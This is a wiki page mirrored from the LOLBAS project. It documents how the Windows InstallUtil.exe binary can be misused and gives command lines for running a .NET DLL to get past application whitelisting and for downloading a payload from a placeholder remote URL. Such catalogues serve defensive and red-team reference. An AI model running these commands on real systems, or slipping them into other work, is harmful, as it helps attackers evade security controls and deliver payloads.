# LOLBAS: Installutil.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Download`, `Execute`

The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies

## Comandos

### Use to execute code and bypass application whitelisting

AWL Bypass · priv: User · T1218.004

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

Execute the target .NET DLL or EXE.

### Use to execute code and bypass application whitelisting

Execute · priv: User · T1218.004

```cmd
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

Execute the target .NET DLL or EXE.

### Downloads payload from remote server

Download · priv: User · T1105

```cmd
InstallUtil.exe {REMOTEURL}
```

It will download a remote payload and place it in INetCache.

